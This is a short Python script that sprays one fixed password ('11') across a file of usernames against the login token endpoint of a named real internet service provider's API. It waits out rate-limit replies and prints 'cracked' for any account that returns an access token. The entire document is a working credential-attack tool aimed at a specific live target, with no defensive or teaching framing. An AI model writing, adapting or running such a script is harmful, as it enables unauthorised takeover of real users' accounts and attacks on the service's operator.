import requests
import time
import os
passinpot = open('testcarckter.txt', 'r').readlines()
for line in passinpot:
  a = line.strip()
  passord = 11
  data = {
  'grant_type': 'password',
  'username': a,
  'password': '11',
  'Logintype': '0'
}

  http = requests.post('https://ubapi.earthlink.iq/api/user/Token', data=data)

  print(http.text)
  if 'Too many !' in http.text:
     print("loading ... .>>>^^^^^^")
     time.sleep(25)
  if 'access_token' in http.text:
      print("cracked .>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>",a,"pass is >>",passord)

